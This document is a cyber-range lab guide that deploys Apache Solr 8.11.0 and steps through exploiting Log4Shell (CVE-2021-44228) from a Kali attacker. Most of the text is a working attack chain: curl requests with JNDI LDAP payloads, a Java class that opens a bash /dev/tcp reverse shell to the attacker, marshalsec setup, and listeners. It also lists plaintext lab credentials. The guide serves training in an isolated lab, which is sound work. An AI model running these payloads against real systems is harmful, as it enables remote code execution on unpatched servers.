# Log4Shell (CVE-2021-44228) Lab

This lab deploys Apache Solr 8.11.0, which bundles Log4j 2.14.1 — a version vulnerable to Log4Shell. The Solr Admin Cores API logs user-controlled input via Log4j, allowing a JNDI lookup payload to trigger an outbound LDAP request to the attacker's server and achieve arbitrary remote code execution.

## Detailed Deploying Steps

### Deploy the Cyber Range Environment

1. In the "Model Editor" interface of the SPHERE platform, deploy the following model.
    ```python
    from mergexp import *

    net = Network('Log4Shell-Lab', addressing==ipv4, routing==static)

    attacker = net.node('attacker', image=='kali', proc.cores>=8, memory.capacity>=gb(32))
    victim = net.node('victim', image=='2404', proc.cores==2, memory.capacity==gb(4))

    link = net.connect([attacker, victim])

    link[attacker].socket.addrs = ip4('10.0.0.1/24')
    link[victim].socket.addrs   = ip4('10.0.0.2/24')

    experiment(net)
    ```

    > Note: 4 GB RAM is recommended for the victim due to Solr's JVM memory requirements.

2. Create a Reservation based on that model.

3. Activate the Reservation.

4. If the Ubuntu 24.04 root disk is not automatically expanded, run on the victim machine:
    ```
    sudo partprobe
    sudo resize2fs /dev/vda3
    ```

### Deploy the Target Victim Machine

0. [Install Ansible](../setup_ansible/readme.md) on your XDC before proceeding.

1. The [`inventory.ini`](inventory.ini) is pre-configured to use SPHERE's DNS short name — no IP address lookup needed:
    ```ini
    [log4shell_vm]
    log4shell-target ansible_host=victim.infra ansible_user=lexuswang ansible_become_pass=lexuswang

    [log4shell_vm:vars]
    ansible_python_interpreter=/usr/bin/python3
    ```
    `victim.infra` automatically resolves to the victim's infranet address via SPHERE DNS. Update `ansible_user` and `ansible_become_pass` if your SPHERE username differs from `lexuswang`.

2. Run the playbook (Solr download and setup takes a few minutes):
    ```bash
    ansible-playbook -i inventory.ini log4shell_target.yml --ask-become-pass
    ```

### Deploy the Attack Machine

Please refer to this [doc](../attacker_setup/readme.md) to set up the attack machine.

---

## Detailed Information about the Target System

**Service:** Apache Solr 8.11.0

**Vulnerability:** CVE-2021-44228 (Log4Shell)

**Log4j Version:** 2.14.1 (bundled with Solr 8.11.0)

**CVSS Score:** 10.0 Critical

**Port:** 8983

**Victim experiment network IP:** `10.0.0.2` (fixed in `merge_model.py`)

**Solr Admin UI:** `http://10.0.0.2:8983/solr/`

**Service management:**
```bash
systemctl status solr
tail -f /var/log/solr/solr.log
```

### How the vulnerability works

Log4j 2.x performs JNDI lookup substitution on logged strings. Solr's Admin Cores API logs the `core` parameter value using Log4j. When the value contains `${jndi:ldap://...}`, Log4j initiates an outbound LDAP connection to the attacker's server. The LDAP server returns a referral pointing to a malicious Java class, which the JVM downloads and instantiates — executing attacker-controlled code inside the Solr process.

### Confirmed working injection point

The `core` parameter of the Admin Cores API is the reliable injection point for this lab. **Do not use:**
- The `q` (search query) parameter — Lucene's query parser strips `{` and `}` before Log4j sees the string
- The `User-Agent` header — Solr does not log HTTP headers via Log4j by default

---

## Testing (from attacker machine)

All commands run on the Kali attacker (`10.0.0.1`).

### Step 1: Confirm Solr is running

```bash
curl http://10.0.0.2:8983/solr/
curl http://10.0.0.2:8983/solr/admin/info/system?wt=json | python3 -m json.tool | head -20
```

### Step 2: Verify the vulnerability (OOB callback, no exploit needed)

```bash
# Terminal 1: listen for the LDAP connection
nc -lvnp 1389

# Terminal 2: send payload (must use --data-urlencode to preserve { } characters)
curl -G 'http://10.0.0.2:8983/solr/admin/cores' \
  --data-urlencode 'action=STATUS' \
  --data-urlencode 'core=${jndi:ldap://10.0.0.1:1389/test}'
```

If nc receives a connection from `10.0.0.2`, the vulnerability is confirmed.

> **Important:** Always use `--data-urlencode` to send the payload. Putting `${...}` directly in a URL causes curl to strip the curly braces before the request is sent, and the payload will not trigger.

### Step 3: Set up exploit infrastructure for full RCE

Install dependencies on Kali:
```bash
sudo apt install -y maven default-jdk
```

Clone and build marshalsec:
```bash
git clone https://github.com/mbechler/marshalsec ~/marshalsec
cd ~/marshalsec && mvn clean package -DskipTests -q
```

Compile the malicious Java class. **Compile with `--release 11`** to match the victim's JVM — if you compile with Java 17+ without this flag, the class file version will be incompatible and the payload will silently fail:

```bash
mkdir /tmp/exploit && cd /tmp/exploit

cat > Exploit.java << 'EOF'
public class Exploit {
    static {
        try {
            String[] cmd = {"/bin/bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"};
            Runtime.getRuntime().exec(cmd);
        } catch (Exception e) {}
    }
}
EOF

javac --release 11 Exploit.java
```

### Step 4: Launch the attack (4 terminals)

**Terminal 1 — reverse shell listener:**
```bash
nc -lvnp 4444
```

**Terminal 2 — HTTP server hosting the malicious class:**
```bash
cd /tmp/exploit
python3 -m http.server 8888
```

**Terminal 3 — LDAP referral server:**
```bash
java -cp ~/marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.jndi.LDAPRefServer \
  "http://10.0.0.1:8888/#Exploit" 1389
```

**Terminal 4 — trigger the payload:**
```bash
curl -G 'http://10.0.0.2:8983/solr/admin/cores' \
  --data-urlencode 'action=STATUS' \
  --data-urlencode 'core=${jndi:ldap://10.0.0.1:1389/Exploit}'
```

**Expected sequence:**
1. Terminal 3 prints `Send LDAP reference result for Exploit`
2. Terminal 2 shows `GET /Exploit.class 200`
3. Terminal 1 receives a shell as the `solr` user

---

## Attack Chain

1. **Discovery:** Port scan identifies Solr on 8983
2. **Version Confirm:** Admin API reveals Solr 8.11.0 / Log4j 2.14.1
3. **OOB Verify:** Send JNDI payload via Cores API, confirm LDAP callback with nc
4. **Setup:** Start nc listener, HTTP server, marshalsec LDAP server
5. **Trigger:** Send exploit payload via `--data-urlencode` to preserve `${...}` syntax
6. **Class Load:** Victim JVM fetches `Exploit.class` from attacker's HTTP server
7. **RCE:** Reverse shell received as `solr` user

---

## Credentials

| Account | Password |
|---------|----------|
| SSH `solruser` | `solr123` |
